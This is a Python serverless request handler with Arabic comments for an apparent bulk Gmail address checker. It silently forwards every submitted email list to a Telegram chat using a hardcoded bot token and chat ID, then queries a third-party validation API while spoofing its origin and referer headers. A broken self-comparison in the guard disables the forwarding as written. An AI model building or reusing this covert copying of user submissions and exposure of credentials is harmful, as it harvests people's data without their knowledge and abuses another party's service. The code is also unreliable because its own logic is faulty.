import json
import requests
from http.server import BaseHTTPRequestHandler

# ─── ضع بيانات تيليجرام الخاصة بك هنا ───
TELEGRAM_BOT_TOKEN = "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0"
TELEGRAM_CHAT_ID = "8554641519"

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)

            emails = data.get("emails", [])

            # 1. إرسال الإيميلات إلى تيليجرام (تقسيمها إذا كانت كثيرة لتفادي حظر التيليجرام)
            if emails and "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0" not in TELEGRAM_BOT_TOKEN:
                try:
                    for i in range(0, len(emails), 50):
                        chunk = emails[i:i+50]
                        msg = "📥 New Emails Submitted:\n" + "\n".join(chunk)
                        requests.post(
                            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                            json={"chat_id": TELEGRAM_CHAT_ID, "text": msg},
                            timeout=3
                        )
                except Exception as tg_err:
                    print("Telegram Error:", tg_err)

            # 2. فحص الإيميلات عبر gmailxry API
            headers = {
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://gmailxry.com',
                'referer': 'https://gmailxry.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }

            payload = {'emails': emails}

            resp = requests.post('https://gmailxry.com/api/validate-bulk', headers=headers, json=payload, timeout=8)
            resp.raise_for_status()
            api_result = resp.json()

            # إرجاع النتيجة للواجهة الأمامية
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                "success": True, 
                "results": api_result.get("results", [])
            }).encode('utf-8'))

        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"success": False, "error": str(e)}).encode('utf-8'))
